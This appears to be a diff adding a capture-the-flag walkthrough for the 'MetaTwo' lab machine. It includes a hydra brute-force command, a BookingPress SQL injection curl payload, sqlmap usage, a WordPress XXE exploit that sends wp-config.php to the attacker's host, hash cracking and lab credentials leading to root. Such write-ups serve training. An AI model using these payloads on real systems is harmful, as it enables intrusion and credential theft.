@@ -1,0 +1,159 @@
+possible wordpress website
+
+ProFTPD Server -> Unix FTP server
+
+/usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -> ftp bruteforce
+
+hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -o ftpBrute ftp://10.10.11.186
+
+No passwords found when brute forcing the FTP
+
+admin is a possible user credential
+
+MetaTwo has a wordpress login page
+
+/usr/share/wordlists/SecLists/Passwords/Honeypot-Captures/Sucuri-Top-Wordpress-Passwords.txt
+
+/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
+
+The booking plugin is a possible vuln, go to http://metapress.htb/events
+and find the wp-content/plugin/ sections and search them for possible vulns
+
+The booking vuln:
+
+curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \ --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+
+in the source code for http://metapress.htb/events you can ctrl+f for _wpnonce
+because the _wpnonce changed per user.
+
+sqlmap -r reqFile -p total_service --dbs
+
+======== Req ============
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.85.0
+Accept: */*
+Content-Length: 99
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&_wpnonce=14bf633400&category_id=33&total_service=0
+
+=========================
+
+SQLmap says there is a blog and information_scheme DB
+
+admin@metapress.htb:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager@metapress.htb:partylikearockstar -> login to wp-admin
+
+These are hashed so let john deal with them
+john passHashList --wordlist=/usr/share/wordlists/rockyou.txt
+
+Our wpscan told us the version of Wordpress being used on the target machine:
+Searching on https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwin99nd2bz9AhVIj4kEHXRhD5kQFnoECAsQAQ&url=https%3A%2F%2Fwpscan.com%2Fwordpress%2F562&usg=AOvVaw3j1zIzfy41eXNrafRR0j3z
+
+There is a vuln with the media library that this WP is using.
+Shows the exploit: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
+
+searchsploit just so happen to have a bash script for the CVE we need!
+NOTICE the .sh script doesnt build the wav file correctly
+
+== args for bash script ==
+
+10.10.11.186
+manager@metapress.htb
+partylikearockstar
+../wp-config.php
+10.10.14.33
+
+===========================
+
+Info from https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
+is very helpful for understanding the exploit and how to build it
+
+Upon upload the wave file when being parsed will make a GET Req to us reading the .dtd file, reading the file the server makes another req to us in the form of ?p='base64 encoded file contents'
+
+We then do echo - 'b64 info' | base64 -d to decode the contents and read what we got
+
+getting the wp-config.php we get creds for the FTP on port 21:
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+FTP metapress.htb:9NYS_ii@FyL_p5M2NvJ
+
+Inside the send_email.php there are possible SSH creds
+
+$mail->Username = "jnelson@metapress.htb";                 
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys"; 
+
+User:cbabce6c0d8b061a2ac9bdecaf71b959
+===========================================================
+
+Inside of jnelsons files he has a PGP file named root.pass
+Its encrypted and requires a passphrase to decrypt
+
+PGP encrypts emails!
+
+inside the .passpie dir u can also perform ls -a again to get the keys (public/private)
+taking the priv key you can use gpg2john to convert to a hash. Then run john against the hash to get the passphrase
+
+-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE----- : p7qfAZt4_A1xo_0x
+  --------------------------------------------------------
+  -----BEGIN PGP MESSAGE----- JNELSON
+
+
+  hQEOA6I+wl+LXYMaEAP/eA8Bw+/AcAvm5g0QFotFRzmToYPSoUr13XcUSSmuEi0c
+
+  4zObpYX4PvSjB6YdhIIxu/cJNZV+WbUuTU0HZTPs49i8qe1xK+g4YRELqhSo6oig
+
+  ZuvQptZzB8LmG8zRVB6c1aO/1SoiRvzfGmgrdaHhtyGA2rtdTZU66MIzZ+irVhED
+
+  /Agw0T3BdpJ15yuNSmyfpf14PeE5r/dWBc6l4/VO6ZZzWyX8SysNxcFDSHChpXsm
+
+  7OR9hpt9HEVZiHq87qNwSYqiNeA9p7uzKV37HQpik3zQvtudc8Ho7IUdU1a5ZCWj
+
+  EmrNsSI0aEBKbJ47ZoX4jfwnjRO5QrDzNf1G9vkbzb2V0k0BtHWiok49YVRmLB63
+
+  GFD/CGo7s1dia+0PP6BNMo0dllqI72/8rGQcM0BFOqzhzKZ3/iNNKoJUiEHzIvMW
+
+  7ome0qtZhiFs+5J3I2U1HA==
+
+  =91YS
+
+  -----END PGP MESSAGE-----
+================================================================
+
+passphrase:blink182
+
+Using an online decryptor we get a possible password so we can su as root
+
+root:p7qfAZt4_A1xo_0x
+
+And now we are root!
